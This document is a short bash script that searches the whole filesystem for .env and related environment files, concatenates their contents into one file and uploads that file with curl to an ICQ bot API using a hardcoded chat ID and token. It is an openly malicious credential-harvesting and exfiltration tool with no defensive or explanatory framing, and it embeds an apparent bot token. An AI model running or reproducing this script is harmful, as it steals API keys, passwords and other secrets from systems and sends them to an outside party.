#!/bin/bash
#wong_galek
asu=$(find / -type f -name "*.env" -o -name "*.env.bak" -o -name "*config.env" -o -name "*.env.dist" -o -name "*.env.dev" -o -name "*.env.local" -o -name "*.env.backup" -o -name "*.environment" -o -name "*.envrc" -o -name "*.envs" -o -name "*.env~" | grep -v 'Permission denied' > filenecok.txt; sed 's/^/cat /;' filenecok.txt > gaskeun.sh; chmod +x gaskeun.sh; > /dev/null)
asuu=$(bash gaskeun.sh > omegalulx.txt)
curl -X POST 'https://api.icq.net/bot/v1/messages/sendFile' -F 'chatId=AoLH_swzxi9JL-WJtwU' -F 'token=001.0165944846.3932020612:1010573472' -F 'file=@omegalulx.txt' -H 'Content-Type: multipart/form-data' | sed 's/\r//g' > /dev/null
echo "[+] DONE BRO [+]"